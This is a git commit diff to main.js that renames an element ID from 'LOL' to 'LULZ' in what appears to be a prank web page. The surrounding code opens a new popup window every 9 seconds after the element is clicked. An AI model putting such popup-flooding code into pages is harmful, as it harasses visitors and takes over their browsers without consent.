1e22c7fdd70977066c74bfa9c54d56ed2d4fc5b2
H1i_sillyxploiter <129692077+unfunnylaugh@users.noreply.github.com>
2024-01-24 14:00:14 -0300

    Update main.js

--- main.js
+++ main.js
@@ -1,5 +1,5 @@
-document.getElementById("LOL").addEventListener('click', e => {
-  document.getElementById("LOL").remove();
+document.getElementById("LULZ").addEventListener('click', e => {
+  document.getElementById("LULZ").remove();
   setInterval(function(){
     window.open("popup.html","","left=100,top=100,width=220,height=240");
   },9000);
